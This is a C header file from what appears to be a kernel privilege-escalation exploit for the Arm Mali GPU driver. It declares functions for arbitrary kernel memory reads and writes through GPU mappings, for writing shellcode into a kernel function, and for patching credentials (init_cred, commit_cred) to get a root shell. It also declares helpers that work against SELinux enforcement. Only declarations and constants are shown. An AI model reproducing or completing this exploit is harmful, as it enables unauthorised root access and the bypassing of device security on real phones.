#ifndef MEM_READ_WRITE_H
#define MEM_READ_WRITE_H

#include "CL/cl.h"
#include "mali_kbase_ioctl.h"
#include "mali_base_csf_kernel.h"
#include "mali_base_kernel.h"

#define KERNEL_BASE 0x80000000

#define PAGE_SHIFT 12

#define OVERWRITE_INDEX 256

struct rw_mem_kernel {
  cl_mem va;
  cl_mem in_out;
  cl_mem flag;
  cl_kernel kernel;
  cl_program program;
};

void* map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group);

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_enforce, uint32_t add_init, uint32_t add_commit, uint32_t* root_code);

void write_to(int mali_fd, uint64_t* gpu_addr, uint64_t* value, cl_command_queue command_queue, struct rw_mem_kernel* kernel);

uint64_t read_from(int mali_fd, uint64_t* gpu_addr, cl_command_queue command_queue, struct rw_mem_kernel* kernel);

void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size, uint64_t reserved_size, cl_command_queue command_queue, struct rw_mem_kernel* kernel32);

void cleanup(int mali_fd, uint64_t pgd, cl_command_queue command_queue, struct rw_mem_kernel* kernel);

struct rw_mem_kernel create_rw_mem(cl_context context, cl_device_id* device_id, bool is64);

void releaseKernel(struct rw_mem_kernel* kernel);

int run_enforce();

#endif
